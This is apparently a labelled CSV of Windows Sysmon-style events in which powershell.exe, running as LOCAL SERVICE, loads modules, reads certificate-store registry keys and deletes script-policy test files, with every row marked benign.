2022-05-13T08:54:09.0060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0110000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0210000Z,26,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_5f34qx4d.0qx.ps1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0210000Z,26,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_i1jtgrrb.hiw.psm1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0610000Z,17,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1460000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.1460000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.1660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3560000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3910000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\Tracing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
